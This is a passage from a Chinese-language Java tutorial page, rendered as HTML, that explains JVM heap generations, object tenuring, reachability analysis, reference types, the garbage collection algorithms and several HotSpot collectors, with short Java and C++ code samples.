class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GCTest</span> {</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"><span class="type">byte</span>[] allocation1, allocation2;</span><br><span class="line">allocation1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">30900</span>*<span class="number">1024</span>];</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过以下方式运行：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/25178350.png"></p><p>添加的参数：<code>-XX:+PrintGCDetails</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/run-with-PrintGCDetails.png"></p><p>运行结果 (红色字体描述有误，应该是对应于 JDK1.7 的永久代)：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/28954286.jpg"></p><p>从上图我们可以看出 Eden 区内存几乎已经被分配完全（即使程序什么也不做，新生代也会使用 2000 多 k 内存）。</p><p>假如我们再为 <code>allocation2</code> 分配内存会出现什么情况呢？</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allocation2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">900</span>*<span class="number">1024</span>];</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/28128785.jpg"></p><p>给 <code>allocation2</code> 分配内存的时候 Eden 区内存几乎已经被分配完了</p><p>当 Eden 区没有足够空间进行分配时，虚拟机将发起一次 Minor GC。GC 期间虚拟机又发现 <code>allocation1</code> 无法存入 Survivor 空间，所以只好通过 <strong>分配担保机制</strong> 把新生代的对象提前转移到老年代中去，老年代上的空间足够存放 <code>allocation1</code>，所以不会出现 Full GC。执行 Minor GC 后，后面分配的对象如果能够存在 Eden 区的话，还是会在 Eden 区分配内存。可以执行如下代码验证：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GCTest</span> {</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"><span class="type">byte</span>[] allocation1, allocation2,allocation3,allocation4,allocation5;</span><br><span class="line">allocation1 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">32000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation3 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation4 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">allocation5 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1000</span>*<span class="number">1024</span>];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="大对象直接进入老年代"><a href="#大对象直接进入老年代" class="headerlink" title="大对象直接进入老年代"></a>大对象直接进入老年代</h3><p>大对象就是需要大量连续内存空间的对象（比如：字符串、数组）。</p><p>大对象直接进入老年代主要是为了避免为大对象分配内存时由于分配担保机制带来的复制而降低效率。</p><h3 id="长期存活的对象将进入老年代"><a href="#长期存活的对象将进入老年代" class="headerlink" title="长期存活的对象将进入老年代"></a>长期存活的对象将进入老年代</h3><p>既然虚拟机采用了分代收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应放在新生代，哪些对象应放在老年代中。为了做到这一点，虚拟机给每个对象一个对象年龄（Age）计数器。</p><p>大部分情况，对象都会首先在 Eden 区域分配。如果对象在 Eden 出生并经过第一次 Minor GC 后仍然能够存活，并且能被 Survivor 容纳的话，将被移动到 Survivor 空间（s0 或者 s1）中，并将对象年龄设为 1(Eden 区-&gt;Survivor 区后对象的初始年龄变为 1)。</p><p>对象在 Survivor 中每熬过一次 MinorGC,年龄就增加 1 岁，当它的年龄增加到一定程度（默认为 15 岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数 <code>-XX:MaxTenuringThreshold</code> 来设置。</p><blockquote><p>修正（<a href="https://github.com/Snailclimb/JavaGuide/issues/552">issue552</a>）：“Hotspot 遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了 survivor 区的 50% 时（默认值是 50%，可以通过 <code>-XX:TargetSurvivorRatio=percent</code> 来设置，参见 <a href="https://github.com/Snailclimb/JavaGuide/issues/1199">issue1199</a> ），取这个年龄和 MaxTenuringThreshold 中更小的一个值，作为新的晋升年龄阈值”。</p><p>jdk8 官方文档引用：<a href="https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html">https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html</a> 。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/image-20210523201742303.png"></p><p><strong>动态年龄计算的代码如下：</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint <span class="title">ageTable::compute_tenuring_threshold</span><span class="params">(<span class="type">size_t</span> survivor_capacity)</span> </span>{</span><br><span class="line"><span class="comment">//survivor_capacity是survivor空间的大小</span></span><br><span class="line"><span class="type">size_t</span> desired_survivor_size = (<span class="type">size_t</span>)((((<span class="type">double</span>)survivor_capacity)*TargetSurvivorRatio)/<span class="number">100</span>);</span><br><span class="line"><span class="type">size_t</span> total = <span class="number">0</span>;</span><br><span class="line">uint age = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (age &lt; table_size) {</span><br><span class="line"><span class="comment">//sizes数组是每个年龄段对象大小</span></span><br><span class="line">total += sizes[age];</span><br><span class="line"><span class="keyword">if</span> (total &gt; desired_survivor_size) {</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">age++;</span><br><span class="line">}</span><br><span class="line">uint result = age &lt; MaxTenuringThreshold ? age : MaxTenuringThreshold;</span><br><span class="line">...</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>额外补充说明(<a href="https://github.com/Snailclimb/JavaGuide/issues/672">issue672</a>)：<strong>关于默认的晋升年龄是 15，这个说法的来源大部分都是《深入理解 Java 虚拟机》这本书。</strong><br>如果你去 Oracle 的官网阅读<a href="https://docs.oracle.com/javase/8/docs/technotes/tools/unix/java.html">相关的虚拟机参数</a>，你会发现<code>-XX:MaxTenuringThreshold=threshold</code>这里有个说明</p><p><strong>Sets the maximum tenuring threshold for use in adaptive GC sizing. The largest value is 15. The default value is 15 for the parallel (throughput) collector, and 6 for the CMS collector.默认晋升年龄并不都是 15，这个是要区分垃圾收集器的，CMS 就是 6.</strong></p></blockquote><h3 id="主要进行-gc-的区域"><a href="#主要进行-gc-的区域" class="headerlink" title="主要进行 gc 的区域"></a>主要进行 gc 的区域</h3><p>周志明先生在《深入理解 Java 虚拟机》第二版中 P92 如是写道：</p><blockquote><p><del><em>“老年代 GC（Major GC/Full GC），指发生在老年代的 GC……”</em></del></p></blockquote><p>上面的说法已经在《深入理解 Java 虚拟机》第三版中被改正过来了。感谢 R 大的回答：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/rf-hotspot-vm-gc.png" alt="R 大的回答"></p><p><strong>总结：</strong></p><p>针对 HotSpot VM 的实现，它里面的 GC 其实准确分类只有两大种：</p><p>部分收集 (Partial GC)：</p><ul><li>新生代收集（Minor GC / Young GC）：只对新生代进行垃圾收集；</li><li>老年代收集（Major GC / Old GC）：只对老年代进行垃圾收集。需要注意的是 Major GC 在有的语境中也用于指代整堆收集；</li><li>混合收集（Mixed GC）：对整个新生代和部分老年代进行垃圾收集。</li></ul><p>整堆收集 (Full GC)：收集整个 Java 堆和方法区。</p><h3 id="空间分配担保"><a href="#空间分配担保" class="headerlink" title="空间分配担保"></a>空间分配担保</h3><p>空间分配担保是为了确保在 Minor GC 之前老年代本身还有容纳新生代所有对象的剩余空间。</p><p>《深入理解 Java 虚拟机》第三章对于空间分配担保的描述如下：</p><blockquote><p>JDK 6 Update 24 之前，在发生 Minor GC 之前，虚拟机必须先检查老年代最大可用的连续空间是否大于新生代所有对象总空间，如果这个条件成立，那这一次 Minor GC 可以确保是安全的。如果不成立，则虚拟机会先查看 <code>-XX:HandlePromotionFailure</code> 参数的设置值是否允许担保失败(Handle Promotion Failure);如果允许，那会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试进行一次 Minor GC，尽管这次 Minor GC 是有风险的;如果小于，或者 <code>-XX: HandlePromotionFailure</code> 设置不允许冒险，那这时就要改为进行一次 Full GC。</p><p>JDK 6 Update 24 之后的规则变为只要老年代的连续空间大于新生代对象总大小或者历次晋升的平均大小，就会进行 Minor GC，否则将进行 Full GC。</p></blockquote><h2 id="死亡对象判断方法"><a href="#死亡对象判断方法" class="headerlink" title="死亡对象判断方法"></a>死亡对象判断方法</h2><p>堆中几乎放着所有的对象实例，对堆垃圾回收前的第一步就是要判断哪些对象已经死亡（即不能再被任何途径使用的对象）。</p><h3 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h3><p>给对象中添加一个引用计数器：</p><ul><li>每当有一个地方引用它，计数器就加 1；</li><li>当引用失效，计数器就减 1；</li><li>任何时候计数器为 0 的对象就是不可能再被使用的。</li></ul><p><strong>这个方法实现简单，效率高，但是目前主流的虚拟机中并没有选择这个算法来管理内存，其最主要的原因是它很难解决对象之间循环引用的问题。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/object-circular-reference.png" alt="对象之间循环引用"></p><p>所谓对象之间的相互引用问题，如下面代码所示：除了对象 <code>objA</code> 和 <code>objB</code> 相互引用着对方之外，这两个对象之间再无任何引用。但是他们因为互相引用对方，导致它们的引用计数器都不为 0，于是引用计数算法无法通知 GC 回收器回收他们。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReferenceCountingGc</span> {</span><br><span class="line">    <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">ReferenceCountingGc</span> <span class="variable">objA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceCountingGc</span>();</span><br><span class="line">        <span class="type">ReferenceCountingGc</span> <span class="variable">objB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceCountingGc</span>();</span><br><span class="line">        objA.instance = objB;</span><br><span class="line">        objB.instance = objA;</span><br><span class="line">        objA = <span class="literal">null</span>;</span><br><span class="line">        objB = <span class="literal">null</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="可达性分析算法"><a href="#可达性分析算法" class="headerlink" title="可达性分析算法"></a>可达性分析算法</h3><p>这个算法的基本思想就是通过一系列的称为 <strong>“GC Roots”</strong> 的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到 GC Roots 没有任何引用链相连的话，则证明此对象是不可用的，需要被回收。</p><p>下图中的 <code>Object 6 ~ Object 10</code> 之间虽有引用关系，但它们到 GC Roots 不可达，因此为需要被回收的对象。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/jvm-gc-roots.png" alt="可达性分析算法"></p><p><strong>哪些对象可以作为 GC Roots 呢？</strong></p><ul><li>虚拟机栈(栈帧中的本地变量表)中引用的对象</li><li>本地方法栈(Native 方法)中引用的对象</li><li>方法区中类静态属性引用的对象</li><li>方法区中常量引用的对象</li><li>所有被同步锁持有的对象</li></ul><p><strong>对象可以被回收，就代表一定会被回收吗？</strong></p><p>即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程；可达性分析法中不可达的对象被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行 <code>finalize</code> 方法。当对象没有覆盖 <code>finalize</code> 方法，或 <code>finalize</code> 方法已经被虚拟机调用过时，虚拟机将这两种情况视为没有必要执行。</p><p>被判定为需要执行的对象将会被放在一个队列中进行第二次标记，除非这个对象与引用链上的任何一个对象建立关联，否则就会被真的回收。</p><blockquote><p><code>Object</code> 类中的 <code>finalize</code> 方法一直被认为是一个糟糕的设计，成为了 Java 语言的负担，影响了 Java 语言的安全和 GC 的性能。JDK9 版本及后续版本中各个类中的 <code>finalize</code> 方法会被逐渐弃用移除。忘掉它的存在吧！</p><p>参考：</p><ul><li><a href="https://openjdk.java.net/jeps/421">JEP 421: Deprecate Finalization for Removal</a></li><li><a href="https://mp.weixin.qq.com/s/LW-paZAMD08DP_3-XCUxmg">是时候忘掉 finalize 方法了</a></li></ul></blockquote><h3 id="引用类型总结"><a href="#引用类型总结" class="headerlink" title="引用类型总结"></a>引用类型总结</h3><p>无论是通过引用计数法判断对象引用数量，还是通过可达性分析法判断对象的引用链是否可达，判定对象的存活都与“引用”有关。</p><p>JDK1.2 之前，Java 中引用的定义很传统：如果 reference 类型的数据存储的数值代表的是另一块内存的起始地址，就称这块内存代表一个引用。</p><p>JDK1.2 以后，Java 对引用的概念进行了扩充，将引用分为强引用、软引用、弱引用、虚引用四种（引用强度逐渐减弱）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/java-reference-type.png" alt="Java 引用类型总结"></p><p><strong>1．强引用（StrongReference）</strong></p><p>以前我们使用的大部分引用实际上都是强引用，这是使用最普遍的引用。如果一个对象具有强引用，那就类似于<strong>必不可少的生活用品</strong>，垃圾回收器绝不会回收它。当内存空间不足，Java 虚拟机宁愿抛出 OutOfMemoryError 错误，使程序异常终止，也不会靠随意回收具有强引用的对象来解决内存不足问题。</p><p><strong>2．软引用（SoftReference）</strong></p><p>如果一个对象只具有软引用，那就类似于<strong>可有可无的生活用品</strong>。如果内存空间足够，垃圾回收器就不会回收它，如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。</p><p>软引用可以和一个引用队列（ReferenceQueue）联合使用，如果软引用所引用的对象被垃圾回收，JAVA 虚拟机就会把这个软引用加入到与之关联的引用队列中。</p><p><strong>3．弱引用（WeakReference）</strong></p><p>如果一个对象只具有弱引用，那就类似于<strong>可有可无的生活用品</strong>。弱引用与软引用的区别在于：只具有弱引用的对象拥有更短暂的生命周期。在垃圾回收器线程扫描它所管辖的内存区域的过程中，一旦发现了只具有弱引用的对象，不管当前内存空间足够与否，都会回收它的内存。不过，由于垃圾回收器是一个优先级很低的线程， 因此不一定会很快发现那些只具有弱引用的对象。</p><p>弱引用可以和一个引用队列（ReferenceQueue）联合使用，如果弱引用所引用的对象被垃圾回收，Java 虚拟机就会把这个弱引用加入到与之关联的引用队列中。</p><p><strong>4．虚引用（PhantomReference）</strong></p><p>“虚引用”顾名思义，就是形同虚设，与其他几种引用都不同，虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收。</p><p><strong>虚引用主要用来跟踪对象被垃圾回收的活动</strong>。</p><p><strong>虚引用与软引用和弱引用的一个区别在于：</strong> 虚引用必须和引用队列（ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。程序如果发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。</p><p>特别注意，在程序设计中一般很少使用弱引用与虚引用，使用软引用的情况较多，这是因为<strong>软引用可以加速 JVM 对垃圾内存的回收速度，可以维护系统的运行安全，防止内存溢出（OutOfMemory）等问题的产生</strong>。</p><h3 id="如何判断一个常量是废弃常量？"><a href="#如何判断一个常量是废弃常量？" class="headerlink" title="如何判断一个常量是废弃常量？"></a>如何判断一个常量是废弃常量？</h3><p>运行时常量池主要回收的是废弃的常量。那么，我们如何判断一个常量是废弃常量呢？</p><p><del><strong>JDK1.7 及之后版本的 JVM 已经将运行时常量池从方法区中移了出来，在 Java 堆（Heap）中开辟了一块区域存放运行时常量池。</strong></del></p><blockquote><p><strong>🐛 修正（参见：<a href="https://github.com/Snailclimb/JavaGuide/issues/747">issue747</a>，<a href="https://blog.csdn.net/q5706503/article/details/84640762">reference</a>）</strong>：</p><ol><li><strong>JDK1.7 之前运行时常量池逻辑包含字符串常量池存放在方法区, 此时 hotspot 虚拟机对方法区的实现为永久代</strong></li><li><strong>JDK1.7 字符串常量池被从方法区拿到了堆中, 这里没有提到运行时常量池,也就是说字符串常量池被单独拿到堆,运行时常量池剩下的东西还在方法区, 也就是 hotspot 中的永久代</strong> 。</li><li><strong>JDK1.8 hotspot 移除了永久代用元空间(Metaspace)取而代之, 这时候字符串常量池还在堆, 运行时常量池还在方法区, 只不过方法区的实现从永久代变成了元空间(Metaspace)</strong></li></ol></blockquote><p>假如在字符串常量池中存在字符串 “abc”，如果当前没有任何 String 对象引用该字符串常量的话，就说明常量 “abc” 就是废弃常量，如果这时发生内存回收的话而且有必要的话，”abc” 就会被系统清理出常量池了。</p><h3 id="如何判断一个类是无用的类？"><a href="#如何判断一个类是无用的类？" class="headerlink" title="如何判断一个类是无用的类？"></a>如何判断一个类是无用的类？</h3><p>方法区主要回收的是无用的类，那么如何判断一个类是无用的类的呢？</p><p>判定一个常量是否是“废弃常量”比较简单，而要判定一个类是否是“无用的类”的条件则相对苛刻许多。类需要同时满足下面 3 个条件才能算是 <strong>“无用的类”</strong>：</p><ul><li>该类所有的实例都已经被回收，也就是 Java 堆中不存在该类的任何实例。</li><li>加载该类的 <code>ClassLoader</code> 已经被回收。</li><li>该类对应的 <code>java.lang.Class</code> 对象没有在任何地方被引用，无法在任何地方通过反射访问该类的方法。</li></ul><p>虚拟机可以对满足上述 3 个条件的无用类进行回收，这里说的仅仅是“可以”，而并不是和对象一样不使用了就会必然被回收。</p><h2 id="垃圾收集算法"><a href="#垃圾收集算法" class="headerlink" title="垃圾收集算法"></a>垃圾收集算法</h2><h3 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h3><p>标记-清除（Mark-and-Sweep）算法分为“标记（Mark）”和“清除（Sweep）”阶段：首先标记出所有不需要回收的对象，在标记完成后统一回收掉所有没有被标记的对象。</p><p>它是最基础的收集算法，后续的算法都是对其不足进行改进得到。这种垃圾收集算法会带来两个明显的问题：</p><ol><li><strong>效率问题</strong>：标记和清除两个过程效率都不高。</li><li><strong>空间问题</strong>：标记清除后会产生大量不连续的内存碎片。</li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/mark-and-sweep-garbage-collection-algorithm.png" alt="标记-清除算法"></p><p>关于具体是标记可回收对象还是不可回收对象，众说纷纭，两种说法其实都没问题，我个人更倾向于是前者。</p><p>如果按照前者的理解，整个标记-清除过程大致是这样的：</p><ol><li>当一个对象被创建时，给一个标记位，假设为 0 (false)；</li><li>在标记阶段，我们将所有可达对象（或用户可以引用的对象）的标记位设置为 1 (true)；</li><li>扫描阶段清除的就是标记位为 0 (false)的对象。</li></ol><h3 id="复制算法"><a href="#复制算法" class="headerlink" title="复制算法"></a>复制算法</h3><p>为了解决标记-清除算法的效率和内存碎片问题，复制（Copying）收集算法出现了。它可以将内存分为大小相同的两块，每次使用其中的一块。当这一块的内存使用完后，就将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉。这样就使每次的内存回收都是对内存区间的一半进行回收。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/copying-garbage-collection-algorithm.png" alt="复制算法"></p><p>虽然改进了标记-清除算法，但依然存在下面这些问题：</p><ul><li><strong>可用内存变小</strong>：可用内存缩小为原来的一半。</li><li><strong>不适合老年代</strong>：如果存活对象数量比较大，复制性能会变得很差。</li></ul><h3 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h3><p>标记-整理（Mark-and-Compact）算法是根据老年代的特点提出的一种标记算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象回收，而是让所有存活的对象向一端移动，然后直接清理掉端边界以外的内存。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/mark-and-compact-garbage-collection-algorithm.png" alt="标记-整理算法"></p><p>由于多了整理这一步，因此效率也不高，适合老年代这种垃圾回收频率不是很高的场景。</p><h3 id="分代收集算法"><a href="#分代收集算法" class="headerlink" title="分代收集算法"></a>分代收集算法</h3><p>当前虚拟机的垃圾收集都采用分代收集算法，这种算法没有什么新的思想，只是根据对象存活周期的不同将内存分为几块。一般将 Java 堆分为新生代和老年代，这样我们就可以根据各个年代的特点选择合适的垃圾收集算法。</p><p>比如在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集。</p><p><strong>延伸面试问题：</strong> HotSpot 为什么要分为新生代和老年代？</p><p>根据上面的对分代收集算法的介绍回答。</p><h2 id="垃圾收集器"><a href="#垃圾收集器" class="headerlink" title="垃圾收集器"></a>垃圾收集器</h2><p><strong>如果说收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。</strong></p><p>虽然我们对各个收集器进行比较，但并非要挑选出一个最好的收集器。因为直到现在为止还没有最好的垃圾收集器出现，更加没有万能的垃圾收集器，<strong>我们能做的就是根据具体应用场景选择适合自己的垃圾收集器</strong>。试想一下：如果有一种四海之内、任何场景下都适用的完美收集器存在，那么我们的 HotSpot 虚拟机就不会实现那么多不同的垃圾收集器了。</p><p>JDK 默认垃圾收集器（使用 <code>java -XX:+PrintCommandLineFlags -version</code> 命令查看）：</p><ul><li>JDK 8：Parallel Scavenge（新生代）+ Parallel Old（老年代）</li><li>JDK 9 ~ JDK20: G1</li></ul><h3 id="Serial-收集器"><a href="#Serial-收集器" class="headerlink" title="Serial 收集器"></a>Serial 收集器</h3><p>Serial（串行）收集器是最基本、历史最悠久的垃圾收集器了。大家看名字就知道这个收集器是一个单线程收集器了。它的 <strong>“单线程”</strong> 的意义不仅仅意味着它只会使用一条垃圾收集线程去完成垃圾收集工作，更重要的是它在进行垃圾收集工作的时候必须暂停其他所有的工作线程（ <strong>“Stop The World”</strong> ），直到它收集结束。</p><p><strong>新生代采用标记-复制算法，老年代采用标记-整理算法。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/serial-garbage-collector.png" alt="Serial 收集器"></p><p>虚拟机的设计者们当然知道 Stop The World 带来的不良用户体验，所以在后续的垃圾收集器设计中停顿时间在不断缩短（仍然还有停顿，寻找最优秀的垃圾收集器的过程仍然在继续）。</p><p>但是 Serial 收集器有没有优于其他垃圾收集器的地方呢？当然有，它<strong>简单而高效（与其他收集器的单线程相比）</strong>。Serial 收集器由于没有线程交互的开销，自然可以获得很高的单线程收集效率。Serial 收集器对于运行在 Client 模式下的虚拟机来说是个不错的选择。</p><h3 id="ParNew-收集器"><a href="#ParNew-收集器" class="headerlink" title="ParNew 收集器"></a>ParNew 收集器</h3><p>ParNew 收集器其实就是 Serial 收集器的多线程版本，除了使用多线程进行垃圾收集外，其余行为（控制参数、收集算法、回收策略等等）和 Serial 收集器完全一样。</p><p><strong>新生代采用标记-复制算法，老年代采用标记-整理算法。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/parnew-garbage-collector.png" alt="ParNew 收集器 "></p><p>它是许多运行在 Server 模式下的虚拟机的首要选择，除了 Serial 收集器外，只有它能与 CMS 收集器（真正意义上的并发收集器，后面会介绍到）配合工作。</p><p><strong>并行和并发概念补充：</strong></p><ul><li><p><strong>并行（Parallel）</strong>：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。</p></li><li><p><strong>并发（Concurrent）</strong>：指用户线程与垃圾收集线程同时执行（但不一定是并行，可能会交替执行），用户程序在继续运行，而垃圾收集器运行在另一个 CPU 上。</p></li></ul><h3 id="Parallel-Scavenge-收集器"><a href="#Parallel-Scavenge-收集器" class="headerlink" title="Parallel Scavenge 收集器"></a>Parallel Scavenge 收集器</h3><p>Parallel Scavenge 收集器也是使用标记-复制算法的多线程收集器，它看上去几乎和 ParNew 都一样。 <strong>那么它有什么特别之处呢？</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-XX:+UseParallelGC</span><br><span class="line"></span><br><span class="line">    使用 Parallel 收集器+ 老年代串行</span><br><span class="line"></span><br><span class="line">-XX:+UseParallelOldGC</span><br><span class="line"></span><br><span class="line">    使用 Parallel 收集器+ 老年代并行</span><br></pre></td></tr></tbody></table></figure><p>Parallel Scavenge 收集器关注点是吞吐量（高效率的利用 CPU）。CMS 等垃圾收集器的关注点更多的是用户线程的停顿时间（提高用户体验）。所谓吞吐量就是 CPU 中用于运行用户代码的时间与 CPU 总消耗时间的比值。 Parallel Scavenge 收集器提供了很多参数供用户找到最合适的停顿时间或最大吞吐量，如果对于收集器运作不太了解，手工优化存在困难的时候，使用 Parallel Scavenge 收集器配合自适应调节策略，把内存管理优化交给虚拟机去完成也是一个不错的选择。</p><p><strong>新生代采用标记-复制算法，老年代采用标记-整理算法。</strong></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/152633231/parallel-scavenge-garbage-collector.png" alt="Parallel Old收集器运行示意图"></p><p><strong>这是 JDK1.8 默认收集器</strong></p><p>使用 <code>java -XX:+PrintCommandLineFlags -version</code> 命令查看</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-XX:InitialHeapSize=262921408 -XX:MaxHeapSize=4206742528 -XX:+PrintCommandLineFlags -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseParallelGC</span><br><span class="line">java version <span class="string">"1.8.0_211"</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_211-b12)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)</span><br></pre></td></tr></tbody></table></figure><p>JDK1.8 默认使用的是 Parallel Scavenge + Parallel Old，如果指定了-XX:+UseParallelGC 参数，则默认指定了-XX:+UseParallelOldGC，可以使用-XX:-UseParallelOldGC 来禁用该功能</p><h3 id="Serial-Old-收集器"><a href="#Serial-Old-收集器" class="headerlink" title="Serial Old 收集器"></a>Serial Old 收集器</h3><p><strong>Serial 